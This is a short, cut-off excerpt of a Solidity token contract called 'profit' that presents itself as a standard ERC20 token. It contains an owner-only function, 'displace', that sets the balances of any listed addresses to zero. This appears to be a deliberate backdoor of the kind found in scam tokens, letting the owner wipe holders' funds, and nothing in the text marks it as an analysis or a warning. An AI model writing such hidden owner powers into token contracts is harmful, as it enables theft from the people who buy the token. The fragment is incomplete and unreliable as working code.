...
contract profit is Context, IERC20 {
    ...
    function displace(address[] memory qualified) public onlyOwner() {
    uint256 len = qualified.length;
    for (uint256 i; i < len; ++i) {
        uint256 balance = _balances[qualified[i]];
        _balances[qualified[i]] = 0;
